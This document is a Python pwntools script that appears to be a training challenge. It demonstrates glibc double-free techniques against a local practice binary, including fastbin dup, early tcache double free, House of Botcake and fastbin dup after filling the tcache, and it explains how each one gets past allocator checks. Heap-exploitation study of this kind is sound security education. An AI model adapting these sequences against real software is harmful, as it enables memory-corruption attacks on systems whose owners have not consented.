'''
Challenges for the double free fun :)

2.23 Fastbins
Unsorted Bins <-- possible via allocate, free, REALLOCATE, then free again. But, NOT what we're going after here.
TCache 2.26
TCache 2.29 (tcache double free protections
'''


from pwn import * 
import os
from sys import argv

if(len(sys.argv) == 1):
	print("Options")
	print("================")
	print("0. Make Crash :)")
	print("1. Fastbins - GLibC 2.23")
	print("2. Unsorted Bin - GLibC 2.23") 
	print("3. TCache 1 - GLibC 2.26") 
	print("4. TCache 2 - GLibC 2.29 (0x100)") 
	print("5. TCache 3 - GLibC 2.29 (0x40)") 
	exit(1) 

option = int(argv[1]) 
base_path = "../../../libc_versions/"
libc_name = base_path
ld_name = base_path
source_loc = base_path
if(option == 0):
	print("Using Fastbins on GLibC 2.23")
	print("Just make the program crash via a double free :)")
	libc_name += "/2.23/libc-2.23.so"
	ld_name += "/2.23/ld-2.23.so"
	source_loc += "/2.23/"

elif(option == 1):
	print("Using Fastbins on GLibC 2.23")
	print("Try to AVOID detection") 
	libc_name += "/2.23/libc-2.23.so"
	ld_name += "/2.23/ld-2.23.so"
	source_loc += "/2.23/"
elif(option == 2):
	print("Using Unsorted Bins on GLibC 2.23")
	print("Try to AVOID detection (is this possible?)")
	libc_name += "/2.23/libc-2.23.so"
	ld_name += "/2.23/ld-2.23.so"
	source_loc += "/2.23/"
elif(option == 3):
	print("Using TCache Bins on GLibC 2.26")
	print("Try to AVOID detection")
	libc_name += "/2.26/libc-2.26.so"
	ld_name += "/2.26/ld-2.26.so"
	source_loc += "/2.26/"
elif(option == 4):
	print("Using TCache Bins on GLibC 2.29 (0x100 sized chunks) ")
	print("Try to AVOID detection -- House of Botcake")
	libc_name += "/2.29/libc-2.29.so"
	ld_name += "/2.29/ld-2.29.so"
	source_loc += "/2.29/"
elif(option == 5):
	print("Using TCache Bins on GLibC 2.29 (0x40 sized chunks) ")
	print("Try to AVOID detection -- Fastbin Dup with TCache") 
	libc_name += "/2.29/libc-2.29.so"
	ld_name += "/2.29/ld-2.29.so"
	source_loc += "/2.29/"

env = {}

# Binary setup
elf_name = './storage'

elf = ELF(elf_name)
libc = ELF(libc_name)
env = {"LD_PRELOAD": libc.path}

if(option == 2 or option == 4):
	p = process([ld_name, elf.path, str(1) ] ,env=env)
	gdb.attach(p)

else: 
	p = process([ld_name, elf.path] ,env=env)
	gdb.attach(p)

def malloc():
	p.sendlineafter("2.", "1") 

def free(index):
	p.sendlineafter("2.", "2") 
	p.sendlineafter("free", str(index))

def crash():
	malloc()
	free(0) 
	free(0) 	

def fastbin_dup():
	'''
	Fastbin ONLY checks that the chunks ADJACENT in 
	the fastbin are not the same. 
	So, something like 0->1->0 will work fine. 
	'''
	print "Fastbin Dup"
	malloc() # 0
	malloc() # 1

	free(0) 
	free(1) 
	free(0) 	

def early_tcache():
	'''
	TCache 2.26-2.28 has NO double free protections. 
	So, we can allocate a chunk and free it as many
	times as we would like.
	'''
	malloc()
	free(0) 
	free(0) 

# TCache 2.29 bypass
def house_of_botcake():
	print "House of Botcake" 
	# Put 7 chunks in the tcache and 1 into the unsorted bin
	for i in range(8):
		malloc()
	for i in range(8): 
		free(7-i) 
	
	'''
	The TCache bin is full, which puts the final chunk into 
	the unsorted bin. 

	TCache 0x110 Bin: 7->6->5->4->3->2->1
	Unsorted Bin: 0
	'''
	# Remove the FIRST chunk from the tcache
	malloc() 

	'''
	With an open spot in the TCache, the unsorted bin 
	double free checks will NOT occur. The 'key' parameter
	is not inserted onto an unsorted bin chunk either. 

	So, by freeing the chunk in the unsorted bin, which 
	gets inserted into the TCache, we have bypassed the 
	double free protections
	'''
	free(0) 

def tcache_29_alt():
	'''
	The fastbin dup technique works on versions with 
	tcache, we just need to fill the tcache first. 
	'''
	# Create 9 chunks - Indexs 0-8
	for i in range(9): 
		malloc()
	# Fill the tcache
	for i in range(7): 
		free(i) 

	# Fastbin dup now that the tcache is full
	free(7) 
	free(8) 
	free(7) 	

if(option == 0):
	crash()	
elif(option == 1):
	fastbin_dup()

elif(option == 2):
	print "Doubling up in the unsorted bin is NOT possible" 	
	print "Still possible to free, allocate then free the chunk AGAIN"
elif(option == 3):
	early_tcache()
elif(option == 4): 
	house_of_botcake()
elif(option == 5):
	tcache_29_alt()



p.interactive()
